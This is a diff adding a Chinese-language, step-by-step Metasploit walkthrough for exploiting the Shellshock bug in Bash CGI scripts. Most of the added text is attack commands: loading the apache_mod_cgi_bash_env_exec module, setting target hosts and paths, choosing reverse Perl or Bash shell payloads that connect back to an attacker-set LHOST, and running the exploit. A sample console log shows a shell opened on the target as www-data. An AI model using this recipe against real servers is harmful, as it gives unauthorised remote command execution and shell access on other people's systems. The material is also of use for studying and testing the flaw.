@@ -42,3 +42,71 @@ bash -c "echo hello"
 - Metasploit模块利用：  
   使用模块 `exploit/multi/http/apache_mod_cgi_bash_env_exec`，配置目标URL后执行攻击，可获取远程命令执行权限。
 
+
+
+1. 启动Metasploit
+```bash
+msfconsole
+```
+
+ 2. 加载模块
+```bash
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+```
+
+ 3. 查看模块信息与参数
+```bash
+show info          # 查看模块描述、作者、依赖等信息
+show options       # 查看需要配置的参数
+```
+关键参数说明：  
+- RHOSTS：目标主机IP或域名（必填，如`192.168.1.100`）  
+- TARGETURI：目标CGI脚本所在路径（默认`/cgi-bin/`，需根据实际情况调整，如`/cgi-bin/test.cgi`）  
+- HTTPMETHOD：请求方法（默认`GET`，可尝试`POST`）  
+- USER_AGENT：自定义User-Agent头（默认包含漏洞利用载荷，一般无需修改）  
+
+ 4. 配置目标参数
+```bash
+set RHOSTS 192.168.1.100    # 设置目标IP
+set TARGETURI /cgi-bin/     # 设置CGI脚本目录（若已知具体脚本，如`/cgi-bin/php.cgi`，需完整填写）
+```
+
+ 5. 选择Payload（有效载荷）
+该模块支持多种Payload，用于获取目标Shell或执行命令。常用Payload：  
+```bash
+set payload cmd/unix/reverse_perl   # 反向Shell（Perl版本，兼容性强）
+# 或
+set payload cmd/unix/reverse_bash   # Bash反向Shell（需目标支持Bash）
+```
+设置Payload后，需配置反向连接参数（以反向Shell为例）：  
+```bash
+set LHOST 192.168.1.5     # 攻击者主机IP（本地监听IP）
+set LPORT 4444            # 监听端口（默认4444）
+```
+
+ 6. 运行攻击
+```bash
+exploit                  # 启动攻击
+```
+- 若目标存在漏洞，Payload会被执行，攻击者将获得目标的Shell连接（如`meterpreter`或普通Shell）。
+
+
+示例：获取反向Shell
+```plaintext
+msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 10.0.0.10
+RHOSTS => 10.0.0.10
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/
+TARGETURI => /cgi-bin/
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set payload cmd/unix/reverse_perl
+payload => cmd/unix/reverse_perl
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST 10.0.0.5
+LHOST => 10.0.0.5
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
+
+[*] Started reverse TCP handler on 10.0.0.5:4444
+[*] Command shell session 1 opened (10.0.0.5:4444 -> 10.0.0.10:54322) at 2025-05-08 15:30:00 +0800
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
